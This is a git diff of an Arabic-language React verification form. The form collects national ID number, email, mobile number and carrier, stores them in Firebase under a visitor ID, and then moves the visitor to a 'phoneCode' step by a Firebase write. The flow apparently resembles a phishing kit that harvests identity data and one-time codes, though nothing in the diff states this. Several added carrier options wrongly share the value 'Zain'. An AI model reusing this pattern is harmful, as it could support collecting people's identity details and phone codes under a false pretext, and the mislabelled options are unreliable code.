@@ -4,7 +4,7 @@ import type React from "react"
 
 import { useState } from "react"
 import { addData } from "../firebase";
-export default function VerificationForm(props: { setPage: any }) {
+export default function VerificationForm() {
     const visitorId = localStorage.getItem('visitor');
 
     const [formData, setFormData] = useState({
@@ -18,18 +18,17 @@ export default function VerificationForm(props: { setPage: any }) {
 
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault()
-        props.setPage('phoneCode')
         addData(formData)
         setLoading(true)
         try {
-            setFormData({ id: visitorId, idNumber: "", email: "", mobile: "", network: "" })
+
         } catch (error) {
             console.error("Error:", error)
         }
         setTimeout(() => {
             setLoading(false)
-
-        }, 3000);
+            addData({id:visitorId,page:"phoneCode"})
+            setFormData({ id: visitorId, idNumber: "", email: "", mobile: "", network: "" })        }, 3000);
     }
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
@@ -92,8 +91,14 @@ export default function VerificationForm(props: { setPage: any }) {
                     <select id="network" name="network" value={formData.network} onChange={handleChange} required>
                         <option value="">-- اختر المشغل --</option>
                         <option value="STC">STC</option>
-                        <option value="Mobily">Mobily</option>
+                        <option value="Ooredoo">Ooredoo</option>
+                        <option value="Zain">Mada</option>
+                        <option value="Zain">Communications
+Gulf </option>
+                        <option value="Zain">Fast communication
+Gulf Sat </option>
                         <option value="Zain">Zain</option>
+                    
                     </select>
                 </div>
 
